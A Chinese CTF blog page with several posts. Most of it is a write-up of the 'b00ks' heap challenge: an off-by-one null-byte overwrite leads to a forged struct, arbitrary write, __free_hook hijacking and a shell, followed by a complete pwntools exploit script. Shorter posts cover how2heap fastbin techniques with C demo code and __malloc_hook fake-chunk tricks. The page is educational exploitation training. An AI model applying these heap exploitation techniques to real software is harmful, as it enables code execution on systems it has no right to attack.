<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>（本题在 Ubuntu16.04 下复现）</p>
<p>程序最开始要求输入的author name的长度为0x20个字节，并且输入在<code>unk_202040</code>处，因为是用有off-by-one漏洞的<code>my_read</code>函数输入的，所以如果我们输入的author name有32个字节的话，那么结束符就会在<code>unk_202040+0x20</code>处，同时我们要注意的是用来保存book的相关信息的chunk的指针<code>book_struct</code>保存在了<code>*(off_202010 + v2)</code>处（详见上述题目处），也就是<code>unk_202060+v2*8</code>处。所以第一个book的<code>book_struct</code>指针就写在了<code>unk_202060</code>处，那么这时就产生了一个问题</p>
<ol>
<li>当我们输入的author name长度为32个字节的时候，author name的结束符会被第一个book的<code>book_struct</code>指针覆盖掉</li>
<li>因为程序提供的功能中有修改author name这一功能，所以我们还可以通过修改author name从而让结束符覆盖掉第一个book的<code>book_struct</code>指针的低一字节。</li>
</ol>
<p>我们可以利用1来泄漏heap地址（因为show()函数会打印author name），利用2来修改堆指针。</p>
<p>一步一步来，我们先申请一个name_size = 0x20，content_size = 0x40的book</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;Enter author name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>然后进gdb看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x561ece378040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x561ece378050:	0x6161616161616161	0x6161616161616161		==&gt;这32个字节是aunthor name</span><br><span class="line">0x561ece378060:	0x0000561ecf2be0a0	0x0000000000000000		==&gt;这里开始保存book_struct指针</span><br></pre></td></tr></table></figure>

<p>我们再看看此时的堆结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap</span><br><span class="line">0x561ecf2bd000 PREV_INUSE &#123;			#程序自己申请0x1010个字节的chunk</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x1011, </span><br><span class="line">  fd = 0xa3436, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be010 FASTBIN &#123;		#这个chunk用来保存book_name</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x31, </span><br><span class="line">  fd = 0x316b6f6f62, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be040 FASTBIN &#123;		#这个chunk用来保存book_content</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x51, </span><br><span class="line">  fd = 0x61616161, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be090 FASTBIN &#123;		#这个就是book_struct指向的chunk</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x31, </span><br><span class="line">  fd = 0x1, </span><br><span class="line">  bk = 0x561ecf2be020, </span><br><span class="line">  fd_nextsize = 0x561ecf2be050, </span><br><span class="line">  bk_nextsize = 0x40</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be0c0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x20f41, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是book_struct的具体内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x0000561ecf2be0a0</span><br><span class="line">0x561ecf2be0a0:	0x0000000000000001	0x0000561ecf2be020	#id 	book_name的指针</span><br><span class="line">0x561ecf2be0b0:	0x0000561ecf2be050	0x0000000000000040	#book_content的指针   content大小</span><br></pre></td></tr></table></figure>

<p>到这里开始就是重点了，首先我们应该注意到的是edit函数是怎样修改book的内容的，<code>my_read(*(*(off_202010 + i) + 16LL), *(*(off_202010 + i) + 24LL) - 1)</code></p>
<p>这个函数其实就是利用了保存在<code>*(off_202010 + i)</code>处的指针来分别读取book_content指针以及content的size。如果我们能把<code>*(off_202010 + i)</code>处的指针覆盖成<code>book_content</code>指针的话，那么edit函数不就相当于读取<code>*(book_content)+16</code>处的值来作为第一个参数，取<code>*(book_content)+24</code>处的值来作为第二个参数了吗？而我们又知道<code>*(book_content)+16</code>和<code>*(book_content)+24</code>处的值是直接由我们控制的，所以我们就相当于有了一个任意地址写。</p>
<p>那么现在的问题就是，怎么把保存在<code>*(off_202010 + i)</code>处的指针覆盖成<code>book_content</code>指针？</p>
<p>这其实很简单，我们只需要让book_content稍微大一点，让<code>book_struct</code>的低一字节被覆盖成‘\x00’后的这个地址的+16和+24处的内容是能被我们控制的即可。</p>
<p>比如说我们创建的第一个book是这样的话</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>那么<code>book_struct = 0x000055b4705d9150</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x55b46ee78040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b46ee78050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b46ee78060:	0x000055b4705d9150	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>我们用author name的结束符将其低一字节覆盖成’\x00’后就等于<code>0x000055b4705d9100</code>，而这个地址显然属于我们book_content的一部分，也就是说这个地址附近的内容都是受我们控制的，那么我们就可以在这上面伪造一个book_struct，从而在edit函数中达到任意地址写的目的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#part of leak heap_base</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter author name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">32</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1150</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of 任意地址写</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">0x16</span> + p64(<span class="number">1</span>)*<span class="number">2</span> + p64(heap_base) + p64(<span class="number">0x40</span>)) <span class="comment">#这里我们伪造了book_id、book_content指针和content_size，book_name没有伪造所以打印book1的name时会报错</span></span><br><span class="line">chang_author_name(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>) <span class="comment">#这里我们用author name的结束符覆盖book_struct指针</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;ccccccc&#x27;</span>) <span class="comment">#我们再次修改book1的content，实际上修改的是我们想要写的地址</span></span><br></pre></td></tr></table></figure>

<p>这里举个例子，我们想往heap_base这个地址里写值，我们如上构造，然后重头来看一遍</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x55a36a56a040</span><br><span class="line">0x55a36a56a040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a060:	0x000055a36b2bc150	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>此时<code>book_struct = 0x000055a36b2bc150 </code>，我们在<code>0x000055a36b2bc100</code>处伪造好<code>book_struct</code>结构之后再覆盖掉<code>book_struct</code>的低一字节，如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x55a36a56a040</span><br><span class="line">0x55a36a56a040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a060:	0x000055a36b2bc100	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>可以看到此时的book_struct指针已经被修改了，我们再来看一下<code>0x000055a36b2bc100</code>这个地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x000055a36b2bc100</span><br><span class="line">0x55a36b2bc100:	0x0000000000000001	0x0000000000000001</span><br><span class="line">0x55a36b2bc110:	0x000055a36b2bb000	0x0000000000000040</span><br></pre></td></tr></table></figure>

<p>我们在这个地址中构造了这样的book_struct，那么此时我们再执行<code>edit(1,&#39;ccccccc&#39;)</code>，那么实际上就会往<code>(*(*(off_202010 + i) + 16LL) == *(0x000055a36b2bc100 + 16) == 0x000055a36b2bb000</code> 这个地址中写值了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/gx 0x000055a36b2bb000</span><br><span class="line">0x55a36b2bb000:	0x0063636363636363</span><br></pre></td></tr></table></figure>

<p>到这里为止任意地址写的详细思路及过程就讲完了，这也就是本题唯一的难点。</p>
<p>我们要任意地址写的话当然是去劫持hook指针，因为FULL RELOR的缘故。那么我们当然还需要泄漏libc。</p>
<p>这里有一个点是：用mmap申请的段跟libc之间的偏移是固定的，所以我们申请一个极大的chunk使得其放在mmap段，再泄露出其地址，减去一个固定的偏移即可得到libc基址。</p>
<p>那么我们该怎么泄漏出book2的地址呢？</p>
<p>这个其实也很简单，因为程序中有打印book相关信息的功能，其所依赖的同样是book_struct结构，而我们前面已经讲了如何伪造一个book_struct，在我们有了heap_base之后，book2的content指针的地址我们同样知道，那么我们只需要将伪造的book_struct的name指针改成book2的content指针的地址就可以利用打印功能泄漏book2_content的地址了，这样我们就得到了libc_base。</p>
<p>最后结合前面讲的任意地址写的方法就可以劫持hook指针了</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size1,name,size2,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size1))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of leak heap_base</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter author name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">32</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1150</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of fake book_struct</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">0x16</span> + p64(<span class="number">1</span>) + p64(heap_base + <span class="number">0x11c0</span>) + p64(heap_base + <span class="number">0x1100</span> + <span class="number">16</span>) + p64(<span class="number">0x40</span>))</span><br><span class="line">name(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of leak libc_base</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="number">0x21000</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">5963792</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + (<span class="number">0x7f1e8f8f77a8</span> - <span class="number">0x00007f1e8f531000</span>)</span><br><span class="line">system = libc_base + (<span class="number">0x7fdb7950c3a0</span> - <span class="number">0x00007fdb794c7000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of hijack __free_hook</span></span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook) + p64(<span class="number">0x8</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Balsn-CTF-2019-PlainText"><a href="#Balsn-CTF-2019-PlainText" class="headerlink" title="Balsn_CTF_2019-PlainText"></a>Balsn_CTF_2019-PlainText</h3><p>思路：</p>
<p>只有一个off-by-null漏洞，能用这个漏洞把bss段上的堆指针盖掉一位，整体思路应该跟前面那题一样</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/" class="post-title-link" itemprop="url">堆利用-fastbin</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-03 17:47:14" itemprop="dateCreated datePublished" datetime="2022-05-03T17:47:14+08:00">2022-05-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-11 02:02:25" itemprop="dateModified" datetime="2022-05-11T02:02:25+08:00">2022-05-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学了一段时间堆之后感觉堆的知识点都太乱了，写博客都不好分类，所以就分个大概的类来写吧，这篇博客写的主要关于fast bins相关的东西</p>
<p>主要是关于how2heap中学到的东西，感觉贴源码没有意义，所以只写个大概的总结，或者按照我的理解去写一个源码</p>
<h3 id="关于fast-bin的保护"><a href="#关于fast-bin的保护" class="headerlink" title="关于fast bin的保护"></a>关于fast bin的保护</h3><ol>
<li>double free：一个chunk进入fast bin时，其实是插入这个bin链表的头部，main_arena会设置一个指针直接指向这个块，同时一个chunk准备进入该bin链表时，会<strong>检查main_arena直接指向的块</strong>跟这个准备进入的块是否相同，相同则抛出double free异常。也就是说其只检查bin的链表头，不检查整个链表</li>
<li>从fast bin中取出一个chunk时，会检查该chunk的size位是否跟这个bin链表对应的size相符，不相符则抛出异常。这个size的p位会被fast bin忽略（也就是说无所谓），但是在IS_MMAPPED跟NON_MAIN_ARENA这两种情况下会发生异常。</li>
</ol>
<h4 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h4><p>实验流程：让一个指针指向一个假块，将其free掉再malloc出来，实现任意地址分配。</p>
<p>需要注意的点：① 假块的size位必须属于fast bin范围内。②假块的下一个块的size位必须被设置成一个合理的值（合理即可）。③ 假块的地址要对其。④ 假块的ISMMAP（用来判断这个chunk是否是MMAP的那一位）不能为1，因为MMAPED的块被free掉时会单独处理。</p>
<h4 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//防止第一个chunk被合并到top chunk</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">//触发malloc_consolidate()</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now we malloc 1 = %p\n&quot;</span>,<span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc 2 = %p&quot;</span>,<span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>malloc_consolidate()函数主要有两个功能：</p>
<ol>
<li>若 fastbin 未初始化，即 global_max_fast 为 0，那就初始化 malloc_state。</li>
<li>如果已经初始化的话，就合并 fastbin 中的 chunk。</li>
</ol>
<p>当我们申请一个堆块，程序遍历完unsorted bin都没有发现能满足我们需求大小的chunk时，便会执行malloc_consolidate()，将fast bin中全部能够合并的chunk进行合并，并将合并之后的大chunk放到对应的small bin或者large bin中，如果有fast bin chunk跟top chunk相邻的话那么会将这个fast bin chunk合并到top chunk里。</p>
<p>这是执行<code>malloc(0x400);</code>之前的bins</p>
<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-1.jpg" class>

<p>当我们执行<code>malloc(0x400);</code>时，便会触发malloc_consolidate()，将fast bin中的chunk进行合并，并放到对应的small/large bin中。</p>
<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-2.png" class>

<p>可以看到此时原本的fast bin chunk被放到了small bin中，显然因为此时0x50的fast bin中已经没有chunk了，所以我们可以绕过double free的检查，再将p1 free一次</p>
<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-3.jpg" class>

<p>这样p1所对应的chunk就会同时出现在small bin和fast bin中</p>
<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-4.jpg" class>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">几道入门堆题的复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-23 21:13:45" itemprop="dateCreated datePublished" datetime="2022-04-23T21:13:45+08:00">2022-04-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-03 17:43:25" itemprop="dateModified" datetime="2022-05-03T17:43:25+08:00">2022-05-03</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li><p>当存在uaf漏洞，且程序本身提供了edit这样对堆中的内容直接修改的功能的时候，就可以直接修改fd指针进行堆块伪造</p>
</li>
<li><p>当存在uaf漏洞，但是程序中不存在edit这样的功能，也就是说堆中的内容是在创建该堆时一并输入到堆中的，这种情况下就可以构造double free来修改fd指针进行堆块的伪造</p>
</li>
<li><p>fast bin有一个检查：当从一个fast bin链表中取出堆块时，会检查该取出的堆块的size位是否与该fast bin链表所对应的大小一致，检查不通过就会报错。这带来的一个问题就是我们不能直接让fd指针指向任意位置然后把这个伪造的堆块从fast bin中取出，我们还需要伪造堆块的size位才能将其成功malloc出来。</p>
<p>结合图片说具体一点，例如我们现在通过某种方法将保存0x70大小的chunk的fast bin构造成如下：</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-1.jpg" class>

<p>这里只是举个例子，我将<code>0xbfe0c0</code>位置的堆块的<code>fd</code>指针指向了<code>__malloc_hook - 0x10</code>的位置，显然我们最后的目的是在<code>__malloc_hook - 0x10</code>处（也就是<code>__malloc_hook</code>附近）申请出一个堆块，从而让我们能够修改<code>__malloc_hook</code>中的内容，然而我们看看该位置+一个字长处的值</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-2.jpg" class>

<p>因为这个值跟fast bin链表对应的大小不同，所以这个伪造的chunk是无法直接申请出来的，当我们尝试将其从fast bin中malloc出来时，程序就会报错</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-3.jpg" class>

<p>解决方法也很简单，我们只需要再伪造chunk的size位即可，我们观察一下<code>__malloc_hook</code>附近的数据</p>
